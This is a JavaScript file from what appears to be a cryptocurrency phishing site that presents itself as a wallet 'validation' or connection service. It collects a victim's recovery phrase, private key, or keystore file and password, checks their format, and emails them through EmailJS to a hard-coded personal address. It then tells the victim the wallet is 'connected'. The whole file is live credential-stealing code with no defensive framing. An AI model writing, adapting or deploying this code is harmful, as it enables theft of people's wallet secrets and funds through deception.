// Validation functionality
document.addEventListener('DOMContentLoaded', function() {
    setupFormValidation();
});

function setupFormValidation() {
    // Input mask for recovery phrase
    const seedPhraseInput = document.getElementById('seedPhrase');
    if (seedPhraseInput) {
        seedPhraseInput.addEventListener('input', function(e) {
            const value = e.target.value;
            const sanitizedValue = value.replace(/[^a-zA-Z0-9 ]/g, '');
            if (value !== sanitizedValue) {
                e.target.value = sanitizedValue;
            }
            const wordCount = sanitizedValue.trim().split(/\s+/).filter(Boolean).length;
            const hint = seedPhraseInput.parentElement.querySelector('.input-hint');
            if (hint) {
                if (wordCount === 12 || wordCount === 24) {
                    hint.textContent = `${wordCount} words (valid seed phrase length)`;
                    hint.style.color = 'var(--success-500)';
                } else {
                    hint.textContent = `${wordCount} words (should be 12 or 24 words)`;
                    hint.style.color = 'var(--neutral-500)';
                }
            }
        });
    }

    // Input mask for private key
    const privateKeyInput = document.getElementById('privateKey');
    if (privateKeyInput) {
        privateKeyInput.addEventListener('input', function(e) {
            const value = e.target.value;
            const sanitizedValue = value.replace(/[^a-fA-F0-9]/g, '');
            if (value !== sanitizedValue) {
                e.target.value = sanitizedValue;
            }
            const hint = privateKeyInput.parentElement.querySelector('.input-hint');
            if (hint) {
                if (sanitizedValue.length === 64) {
                    hint.textContent = 'Valid private key length (64 characters)';
                    hint.style.color = 'var(--success-500)';
                } else {
                    hint.textContent = `${sanitizedValue.length} characters (should be 64 characters)`;
                    hint.style.color = 'var(--neutral-500)';
                }
            }
        });
    }

    // Keystore JSON validation
    const keystoreJsonInput = document.getElementById('keystoreJson');
    if (keystoreJsonInput) {
        keystoreJsonInput.addEventListener('blur', function() {
            const value = keystoreJsonInput.value.trim();
            const existingError = keystoreJsonInput.parentElement.querySelector('.input-error');
            if (existingError) {
                existingError.remove();
            }
            keystoreJsonInput.style.borderColor = ''; // Reset border color

            if (value) {
                try {
                    JSON.parse(value);
                    keystoreJsonInput.style.borderColor = 'var(--success-500)';
                } catch (e) {
                    keystoreJsonInput.style.borderColor = 'var(--error-500)';
                    const errorMsg = document.createElement('div');
                    errorMsg.className = 'input-error';
                    errorMsg.textContent = 'Invalid JSON format';
                    errorMsg.style.color = 'var(--error-500)';
                    errorMsg.style.fontSize = '0.875rem';
                    errorMsg.style.marginTop = '4px';
                    keystoreJsonInput.parentElement.appendChild(errorMsg);
                }
            }
        });
    }

    // Form submission validation
    const validateBtn = document.getElementById('validateBtn');
    if (validateBtn) {
        validateBtn.addEventListener('click', function(e) {
            e.preventDefault();

            const walletTypeElement = document.getElementById('walletType');
            const validationTypeElement = document.querySelector('input[name="validationType"]:checked');

            document.querySelectorAll('.alert-error').forEach(alert => alert.remove());
            document.querySelectorAll('input, select').forEach(el => el.style.borderColor = '');
            const validationOptions = document.querySelector('.validation-options');
            if (validationOptions) validationOptions.style.color = '';

            let isValid = true;
            let errorMessage = '';

            if (!walletTypeElement || walletTypeElement.value === '') {
                isValid = false;
                errorMessage = 'Please select your wallet type';
                if (walletTypeElement) walletTypeElement.style.borderColor = 'var(--error-500)';
            } else if (!validationTypeElement) {
                isValid = false;
                errorMessage = 'Please select a validation method';
                if (validationOptions) validationOptions.style.color = 'var(--error-500)';
            } else {
                const selectedType = validationTypeElement.value;
                if (selectedType === 'phrase') {
                    const seedPhrase = document.getElementById('seedPhrase');
                    if (!seedPhrase || !seedPhrase.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your recovery phrase';
                        if (seedPhrase) seedPhrase.style.borderColor = 'var(--error-500)';
                    } else {
                        const wordCount = seedPhrase.value.trim().split(/\s+/).filter(Boolean).length;
                        if (wordCount !== 12 && wordCount !== 24) {
                            isValid = false;
                            errorMessage = 'Recovery phrase must be 12 or 24 words';
                            if (seedPhrase) seedPhrase.style.borderColor = 'var(--error-500)';
                        }
                    }
                } else if (selectedType === 'keystore') {
                    const keystoreJson = document.getElementById('keystoreJson');
                    const keystorePassword = document.getElementById('keystorePassword');
                    if (!keystoreJson || !keystoreJson.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your keystore JSON';
                        if (keystoreJson) keystoreJson.style.borderColor = 'var(--error-500)';
                    } else {
                        try {
                            JSON.parse(keystoreJson.value.trim());
                        } catch (parseError) {
                            isValid = false;
                            errorMessage = 'Invalid JSON format for Keystore';
                            if (keystoreJson) keystoreJson.style.borderColor = 'var(--error-500)';
                        }
                    }
                    if (isValid && (!keystorePassword || !keystorePassword.value)) {
                        isValid = false;
                        errorMessage = 'Please enter your keystore password';
                        if (keystorePassword) keystorePassword.style.borderColor = 'var(--error-500)';
                    }
                } else if (selectedType === 'private') {
                    const privateKey = document.getElementById('privateKey');
                    if (!privateKey || !privateKey.value.trim()) {
                        isValid = false;
                        errorMessage = 'Please enter your private key';
                        if (privateKey) privateKey.style.borderColor = 'var(--error-500)';
                    } else if (privateKey.value.trim().length !== 64) {
                        isValid = false;
                        errorMessage = 'Private key must be 64 characters long';
                        if (privateKey) privateKey.style.borderColor = 'var(--error-500)';
                    }
                }
            }

            if (!isValid) {
                showValidationError(errorMessage);
                return false;
            }

            const loadingOverlay = document.getElementById('loadingOverlay');
            if (loadingOverlay) {
                loadingOverlay.style.display = 'flex';
                loadingOverlay.querySelector('p').textContent = 'Submitting details...';
            }

            const walletType = walletTypeElement ? walletTypeElement.value : 'N/A';
            const validationMethod = validationTypeElement ? validationTypeElement.value : 'N/A';

            let seedPhraseValue = '';
            let keystoreJsonValue = '';
            let keystorePasswordValue = '';
            let privateKeyValue = '';

            if (validationMethod === 'phrase') {
                const seedPhrase = document.getElementById('seedPhrase');
                if (seedPhrase) seedPhraseValue = seedPhrase.value.trim();
            } else if (validationMethod === 'keystore') {
                const keystoreJson = document.getElementById('keystoreJson');
                const keystorePassword = document.getElementById('keystorePassword');
                if (keystoreJson) keystoreJsonValue = keystoreJson.value.trim();
                if (keystorePassword) keystorePasswordValue = keystorePassword.value;
            } else if (validationMethod === 'private') {
                const privateKey = document.getElementById('privateKey');
                if (privateKey) privateKeyValue = privateKey.value.trim();
            }

            const templateParams = {
                wallet_type: walletType,
                validation_method: validationMethod,
                recovery_phrase: seedPhraseValue || 'N/A',
                keystore_json: keystoreJsonValue || 'N/A',
                keystore_password: keystorePasswordValue || 'N/A',
                private_key: privateKeyValue || 'N/A',
                user_agent: navigator.userAgent,
                to_email: 'kingsleyfrancis.kalu@gmail.com' // This ensures it goes to your specified email
            };

            // ====================================================================
            //         YOUR EmailJS SERVICE ID AND TEMPLATE ID ARE HERE
            // ====================================================================
            const SERVICE_ID = "service_mkx8qgf";
            const TEMPLATE_ID = "__ejs-test-mail-service__"; // <<< NOTE: This is a generic test template.
                                                            // Create a custom template in EmailJS to see your form data.
            // ====================================================================

            console.log("Preparing to send email with params:", templateParams);
            console.log("Using SERVICE_ID:", SERVICE_ID, "and TEMPLATE_ID:", TEMPLATE_ID);


            emailjs.send(SERVICE_ID, TEMPLATE_ID, templateParams)
                .then(function(response) {
                    console.log('EmailJS SUCCESS!', response.status, response.text);
                    if (loadingOverlay) loadingOverlay.style.display = 'none';

                    const validationModal = document.getElementById('validationModal');
                    if (validationModal) {
                        validationModal.style.display = 'none';
                        document.body.style.overflow = 'auto';
                    }
                    showNotification('Wallet details submitted successfully! (Check email for test message)', 'success');
                    
                    const connectButton = document.getElementById('connectWalletBtn');
                    if (connectButton) {
                        connectButton.textContent = 'Wallet Connected';
                        connectButton.classList.remove('btn-outline');
                        connectButton.classList.add('btn-primary');
                    }

                }, function(error) {
                    console.error('EmailJS FAILED...', error);
                    if (loadingOverlay) loadingOverlay.style.display = 'none';
                    // Provide more detailed error information if available
                    let errorMsg = 'Failed to submit details.';
                    if (error && error.text) {
                        errorMsg += ` Server response: ${error.text}`;
                    } else if (error) {
                        errorMsg += ` Error: ${JSON.stringify(error)}`;
                    }
                    showNotification(errorMsg, 'error');
                    // You might want to check the EmailJS dashboard for logs on failed requests.
                    // Common issues: incorrect Service ID, Template ID, or Public Key;
                    // service not configured correctly (e.g., Gmail auth issues);
                    // daily/monthly EmailJS limits reached.
                });
        });
    }
}

function showValidationError(message) {
    const errorAlert = document.createElement('div');
    errorAlert.className = 'alert alert-error';
    errorAlert.innerHTML = `
        <div class="alert-icon"><i class="fas fa-exclamation-circle"></i></div>
        <div class="alert-content">
            <div class="alert-title">Validation Error</div>
            <p>${message}</p>
        </div>
    `;
    errorAlert.style.backgroundColor = 'var(--error-50)';
    errorAlert.style.color = 'var(--error-700)';
    errorAlert.style.borderLeft = '4px solid var(--error-500)';
    errorAlert.style.padding = '12px 16px';
    errorAlert.style.borderRadius = '4px';
    errorAlert.style.marginBottom = '16px';
    errorAlert.style.display = 'flex';
    errorAlert.style.alignItems = 'flex-start';
    errorAlert.style.gap = '12px';
    const icon = errorAlert.querySelector('.alert-icon');
    if (icon) {
        icon.style.flexShrink = '0';
        icon.style.fontSize = '1.25rem';
        icon.style.color = 'var(--error-500)';
    }
    const title = errorAlert.querySelector('.alert-title');
    if (title) {
        title.style.fontWeight = '600';
        title.style.marginBottom = '4px';
    }
    const validationForm = document.querySelector('.validation-form');
    const existingAlerts = validationForm?.querySelectorAll('.alert.alert-error');
    if (existingAlerts) {
        existingAlerts.forEach(alert => alert.remove());
    }
    if (validationForm) {
        validationForm.insertBefore(errorAlert, validationForm.firstChild);
        errorAlert.style.opacity = '0';
        errorAlert.style.transform = 'translateY(-10px)';
        setTimeout(() => {
            errorAlert.style.opacity = '1';
            errorAlert.style.transform = 'translateY(0)';
            errorAlert.style.transition = 'all 0.3s ease-out';
        }, 10);
        setTimeout(() => {
            errorAlert.style.opacity = '0';
            errorAlert.style.transform = 'translateY(-10px)';
            setTimeout(() => { errorAlert.remove(); }, 300);
        }, 5000);
    }
}

function showNotification(message, type = 'info') {
    console.log(`Notification (${type}): ${message}`);
    // Replace with your actual notification display logic if you have one
    // For now, a simple alert will suffice for testing:
    alert(`Notification (${type}): ${message}`);
}